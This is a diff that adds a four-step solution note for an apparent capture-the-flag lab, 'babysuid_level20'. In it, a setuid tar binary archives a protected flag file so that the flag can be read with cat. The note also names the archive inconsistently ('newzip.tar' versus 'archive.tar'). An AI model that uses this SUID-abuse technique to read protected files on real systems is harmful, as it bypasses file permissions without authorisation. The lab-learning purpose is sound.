@@ -1,0 +1,4 @@
+1. cd ../..
+2. ./challenge/babysuid_level20
+3. we now have access to the command ./usr/bin/tar which is another notorious compression function | we can compress the flag into a file called newzip.tar via the command ./usr/bin/tar -cvf archive.tar flag
+4. we now have a file called archive.tar and can access the flag by simply running cat archive.tar and the flag is available at the end
